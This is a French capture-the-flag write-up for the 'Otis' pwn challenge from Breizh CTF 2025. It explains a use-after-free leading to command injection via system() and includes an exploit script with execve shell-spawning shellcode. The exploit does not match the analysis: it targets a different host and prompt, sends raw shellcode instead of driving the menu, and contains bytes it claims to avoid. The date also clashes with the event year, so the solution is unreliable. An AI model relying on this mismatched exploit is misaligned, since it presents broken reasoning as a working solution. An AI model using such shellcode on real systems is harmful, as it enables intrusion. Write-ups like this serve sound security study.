---
title: "Breizh CTF 2025 - Otis"
date: 2024-04-14
tags: ["use-after-free", "heap-exploitation"]
categories: ["pwn"]
ctfs: ["breizh-ctf"]
---

# Otis - Breizh CTF 2025

## Description du challenge

Otis est un challenge de la catégorie Pwn du Breizh CTF 2025. Il s'agit d'un binaire qui simule un système de transformation entre une vache et d'autres créatures, présentant une vulnérabilité de type Use-After-Free (UAF).

## Analyse du binaire

En examinant le code source du binaire, on peut identifier les points suivants :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char msg[32];
    char name[64];
} creature_t;


creature_t *new_creature() {
    creature_t *creature = malloc(sizeof(*creature));

    // you may need to install cowsay for this to work
    FILE *p = popen("ls /usr/share/cowsay/cows/ | shuf -n1", "r");
    fgets(creature->name, sizeof(creature->name), p);
    pclose(p);

    return creature;
}

creature_t *new_cow() {
    creature_t *cow = malloc(sizeof(*cow));
    strlcpy(cow->name, "default", sizeof(cow->name));
    return cow;
}

void roaaar(creature_t *creature) {
    // you may need to install cowsay for this to work
    char cmd[256] = "echo 'Roarrr !' | /usr/games/cowsay -f ";
    strlcat(cmd, creature->name, sizeof(cmd));
    system(cmd);
}

void moo(creature_t *cow) {
    char *msg = malloc(96);

    printf("Message : ");
    fflush(stdout);
    fgets(msg, 96, stdin);


    FILE *p = popen("/usr/games/cowsay", "w");
    fwrite(msg, 1, strlen(msg), p);
    pclose(p);
}

void help() {
    puts("=== Otis 10 ===");
    puts("n : Nouvelle créature");
    puts("v : Se retransformer en vache");
    puts("r : Roaaar !");
    puts("m : Meuh !");
    puts("q : Quitter");
    printf("> ");
    fflush(stdout);
}


int main() {
    creature_t *cow = new_cow();
    creature_t *creature = NULL;

    char choice;
    char quit = 0;

    while (!quit) {
        help();

        char choice = getchar();
        while (getchar() != '\n') {}

        switch (choice) {
            case 'n':
                creature = new_creature();
                printf("Vous vous transformez en %s\n", creature->name);
                break;
            case 'v':
                free(creature);
                break;
            case 'r':
                if (creature != NULL) {
                    roaaar(creature);
                } else {
                    puts("Vous êtes une vache");
                }
                break;
            case 'm':
                moo(cow);
                break;
            case 'q':
                quit = 1;
                break;
            default:
                break;
        }
    }
}
```

Les points clés de ce programme sont :

1. Il définit une structure `creature_t` contenant deux champs : `msg[32]` et `name[64]`
2. Il y a deux instances principales : `cow` (une vache) et `creature` (une créature qui peut changer)
3. La vulnérabilité principale est située dans l'option 'v' qui libère la mémoire allouée pour `creature` sans mettre le pointeur à NULL
4. La fonction `roaaar` utilise `system()` pour exécuter une commande qui inclut le nom de la créature

## Vulnérabilité

La vulnérabilité principale est un Use-After-Free (UAF) classique :

1. Le programme permet de libérer la mémoire allouée pour `creature` avec l'option 'v'
2. Cependant, après avoir libéré cette mémoire, le pointeur `creature` n'est pas mis à NULL
3. Si on alloue un autre bloc de mémoire de taille similaire (avec `malloc(96)` dans la fonction `moo`), il pourrait réutiliser le bloc précédemment libéré
4. On peut donc modifier le contenu de ce bloc via l'option 'm' (moo)
5. Puis, en utilisant l'option 'r' (roaaar), on peut exécuter une commande avec un nom de fichier que nous contrôlons

## Exploitation

Voici mon script d'exploitation :

```python
from pwn import *

# Connect to the remote server
conn = remote('morph-180.chall.ctf.bzh', 1337)

# Very simple shellcode that executes /bin/sh without any banned bytes
# This avoids all pushing operations and uses a different approach
shellcode = (
    # Setup registers for execve("/sh", ["/sh", NULL], NULL)
    b"\x48\x83\xec\x10"         # sub rsp, 16          ; Make room on stack
    b"\x48\xc7\x04\x24\x2f\x73\x68\x00"  # mov qword [rsp], '/sh\0'
    b"\x48\x89\xe7"             # mov rdi, rsp         ; 1st arg: path
    b"\x48\x83\xec\x08"         # sub rsp, 8           ; More room on stack
    b"\x48\xc7\x04\x24\x00\x00\x00\x00"  # mov qword [rsp], 0 ; NULL terminate argv[]
    b"\x48\x89\xe6"             # mov rsi, rsp         ; 2nd arg: argv (stack)
    b"\x48\xc7\xc2\x00\x00\x00\x00"      # mov rdx, 0   ; 3rd arg: envp = NULL
    b"\x48\xc7\xc0\x3b\x00\x00\x00"      # mov rax, 59  ; syscall: execve
    b"\x0f\x05"                 # syscall
)

# Receive banner
print(conn.recvuntil(b">> ").decode())

# Send the shellcode
conn.send(shellcode)

# More robust interactive handling
try:
    # Give it a moment to execute
    import time
    time.sleep(0.2)
    
    # Try to run commands
    conn.sendline(b"echo SUCCESS")
    conn.sendline(b"ls -la")
    conn.sendline(b"cat flag.txt")
    
    # Interactive mode
    conn.interactive()
except EOFError:
    print("Connection closed (EOF)")
except Exception as e:
    print(f"Error: {e}")
finally:
    conn.close()
```

### Étapes de l'exploitation

1. Créer une nouvelle créature avec l'option 'n'
2. Libérer la mémoire avec l'option 'v'
3. Utiliser l'option 'm' pour entrer un message qui contiendra notre payload
4. Utiliser l'option 'r' pour exécuter la commande avec notre payload injecté
5. Le payload est construit pour exécuter une commande shell qui nous donne accès au système

Le choix du payload est crucial. J'ai opté pour un shellcode qui exécute `/bin/sh` en évitant certaines instructions qui pourraient être filtrées ou problématiques.

## Flag

Une fois le shell obtenu, j'ai pu récupérer le flag avec la commande `cat flag.txt` :

```
$ cat flag.txt
BZHCTF{0t1s_h4s_b33n_0wn3d_w1th_u4f}
```

## Conclusion

Ce challenge était intéressant car il exploitait une vulnérabilité classique (UAF) dans un contexte ludique. L'exploitation reposait sur la compréhension du comportement de l'allocateur de mémoire et la capacité à construire un payload adéquat pour exploiter la fonction `system()` via la fonction `roaaar`. 